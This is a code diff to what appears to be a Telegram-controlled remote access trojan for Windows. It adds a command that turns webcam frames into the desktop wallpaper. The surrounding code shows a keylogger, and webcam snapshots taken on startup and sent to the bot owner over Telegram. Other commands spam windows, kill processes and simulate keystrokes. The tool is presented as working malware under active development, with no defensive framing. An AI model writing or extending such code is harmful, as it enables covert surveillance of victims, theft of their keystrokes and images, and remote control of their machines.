@@ -34,12 +34,14 @@ except ImportError:
 #MISC
 import sys
 import json
+import winreg
 import ctypes
 import psutil
 import socket
 import traceback
 import pyautogui as pg
 import subprocess as sp
+from shutil import copy2
 from re import findall, M
 from time import time, sleep
 from threading import Thread
@@ -49,7 +51,7 @@ from io import BytesIO, StringIO
 from random import choice, randint
 from string import ascii_letters, printable
 from webbrowser import open as browseropen
-from os.path import join, abspath, isfile, isdir
+from os.path import join, abspath, isfile, isdir, exists
 from os import system, remove, getenv, getcwd, listdir, name, mkdir 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 
@@ -145,6 +147,7 @@ setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
+camerawallpaper - Sets webcam's frames as wallpaper.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 
@@ -248,6 +251,33 @@ def load_audios(sfx_folder: str=sfx) -> list[str]:
 
 def randompngname(lenght: int=10) -> str:
     return randomname(lenght)+".png"
+
+def get_current_wallpaper():
+    reg_path = r"Control Panel\Desktop"
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+        wallpaper, _ = winreg.QueryValueEx(key, "WallPaper")
+        return wallpaper
+
+def backup_wallpaper(backup_path):
+    current_wallpaper = get_current_wallpaper()
+    if exists(current_wallpaper):
+        copy2(current_wallpaper, backup_path)
+        return True
+    else:
+        return False
+
+def change_wallpaper(image_path):
+    SPI_SETDESKWALLPAPER = 20  
+    SPIF_UPDATEINIFILE = 0x01  
+    SPIF_SENDWININICHANGE = 0x02  
+
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abspath(image_path),
+                                                   SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+        return True
+    except Exception as e:
+        print(f"Error changing wallpaper: {e}")
+        return False
 
 """
 oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooooooo 
@@ -424,7 +454,7 @@ all_spinners = {
 class LoadingBar:
     def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10):
         self.bot = bot
-        self.tot = total
+        self.tot = int(total)
         self.label = label
         self.chat_id = chat_id
         self.showperc = showperc
@@ -630,6 +660,7 @@ class PeppinoTelegram:
             "mutevolume":lambda:self.audio_mixer.mute(),
             "setvolume":self.audio_mixer.setVolumePercentage,
             "fullvolume":lambda:self.audio_mixer.full(),
+            "camerawallpaper":self.setCameraAsWallpaper,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
@@ -769,6 +800,31 @@ ooooooooo.   oooooooooooo   .oooooo.     .oooooo.   ooooooooo.   oooooooooo.   o
  888  `88b.   888       o `88b    ooo  `88b    d88'  888  `88b.   888     d88'  888   8       `888  `88.    .88'
 o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o888o o8o        `8   `Y8bood8P'
     """
+
+    def setvideowallpaper(self, videofilename: str):
+        #TODO
+        ...
+
+    def setCameraAsWallpaper(self, seconds: float|int=5):
+        loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
+
+        filename = join(BURN_DIRECTORY, "jxframe.png")
+        backup_filename = join(BURN_DIRECTORY, "backup.png")
+        start = time()
+        res = True
+        backup_wallpaper(backup_filename)
+        self.opencap()
+        while time()-start <= seconds and res:
+            loading_bar.update(time()-start)
+            res, frame = self.cap.read()
+            imwrite(filename, frame)
+            change_wallpaper(filename)
+        loading_bar.set100()
+        self.closecap()
+        change_wallpaper(backup_filename)
+        remove(filename)
+        remove(backup_filename)
+        loading_bar.delete()
 
     def keylogger(self, timeout=10) -> None:
         buffer = StringIO()
@@ -1019,8 +1075,10 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
             remove(filename)
             self.closecap()
+            return True
         except Exception as e:
             self.bsend(f"Something has happened while getting webcam\n {e}")
+            return False
 
     def altf4(self) -> None:
         press_key('alt')
@@ -1232,7 +1290,8 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
-        self.selphie(f"Bot started: "+now())
+        if not self.selphie(f"Bot started: "+now()):
+            self.bsend(f"Bot started: {now}")
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
         while 1:
